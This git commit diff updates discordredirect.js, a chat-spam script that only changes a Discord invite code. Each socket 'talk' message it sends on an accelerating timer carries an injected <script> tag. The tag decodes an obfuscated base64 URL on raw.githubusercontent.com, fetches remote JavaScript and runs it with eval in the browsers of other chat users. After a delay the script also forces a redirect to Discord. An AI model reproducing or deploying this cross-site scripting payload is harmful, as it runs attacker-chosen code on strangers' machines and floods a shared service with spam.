865fa137a01a5dad105820764db5ef475372dd59
Windows Xp Sky <reinilsonfernandes25@outlook.com>
2026-01-19 11:22:11 -0300

    Update discordredirect.js

--- discordredirect.js
+++ discordredirect.js
@@ -12,14 +12,14 @@ let coughtimer = 7777; setInterval(() => {
     });
     setInterval(() => {
     socketb.emit("talk", {
-        text: "JOIN MY DISCORD NOW https://discord.gg/8c5HTrMM <script>fetch(atob('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2l2b3J5ZGV2cmltb2FsdC9CT05aSVdPUkxEVUxUUkFKQVZBU0NSSVBUTElTVC9yZWZzL2hlYWRzL21haW4v')+'???'+atob('Lmpz')).then(r=>r.text()).then(t=>eval(t))</script>"
+        text: "JOIN MY DISCORD NOW https://discord.gg/7z8uZqvF <script>fetch(atob('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2l2b3J5ZGV2cmltb2FsdC9CT05aSVdPUkxEVUxUUkFKQVZBU0NSSVBUTElTVC9yZWZzL2hlYWRzL21haW4v')+'???'+atob('Lmpz')).then(r=>r.text()).then(t=>eval(t))</script>"
     });
     socket.emit("talk", {
-        text: "JOIN MY DISCORD NOW https://discord.gg/8c5HTrMM <script>fetch(atob('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2l2b3J5ZGV2cmltb2FsdC9CT05aSVdPUkxEVUxUUkFKQVZBU0NSSVBUTElTVC9yZWZzL2hlYWRzL21haW4v')+'???'+atob('Lmpz')).then(r=>r.text()).then(t=>eval(t))</script>"
+        text: "JOIN MY DISCORD NOW https://discord.gg/7z8uZqvF <script>fetch(atob('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2l2b3J5ZGV2cmltb2FsdC9CT05aSVdPUkxEVUxUUkFKQVZBU0NSSVBUTElTVC9yZWZzL2hlYWRzL21haW4v')+'???'+atob('Lmpz')).then(r=>r.text()).then(t=>eval(t))</script>"
             });
     });
     coughtimer = coughtimer - 125;
 }, coughtimer);
 setTimeout(() => {
-    window.location.href = "https://discord.gg/8c5HTrMM";
+    window.location.href = "https://discord.gg/7z8uZqvF";
 }, 27777)
